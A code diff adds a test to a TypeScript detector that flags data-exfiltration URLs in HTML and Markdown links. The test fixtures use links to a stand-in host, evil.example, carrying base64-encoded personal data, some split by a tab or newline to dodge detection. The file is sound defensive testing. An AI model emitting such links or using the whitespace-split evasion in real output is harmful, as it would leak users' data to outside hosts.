@@ -44,3 +44,10 @@ test("payload inside parentheses of a link target is still seen", () => {
   assert.ok(plug("[x](https://evil.example/p?d=(ZGFuYS5yZXllc0Bub3J0aHdpbmQ=))").findings.some((f) => f.type === "URL"));
   assert.equal(plug("See (https://docs.example.com/guide) now").findings.length, 0);
 });
+
+test("payload split by tab or newline is rejoined like a browser would", () => {
+  const blocked = (t: string) => plug(t).findings.some((f) => f.type === "URL");
+  assert.ok(blocked("<a href=\"https://evil.example/p?d=ZGFuYS5yZXll\tc0Bub3J0aHdpbmQ=\">x</a>".replace(/"/g, "") ));
+  assert.ok(blocked("[x](https://evil.example/p?d=ZGFuYS5yZXll\r\nc0Bub3J0aHdpbmQ=)"));
+  assert.equal(plug("Read https://docs.example.com/guide\nthen continue").findings.length, 0);
+});
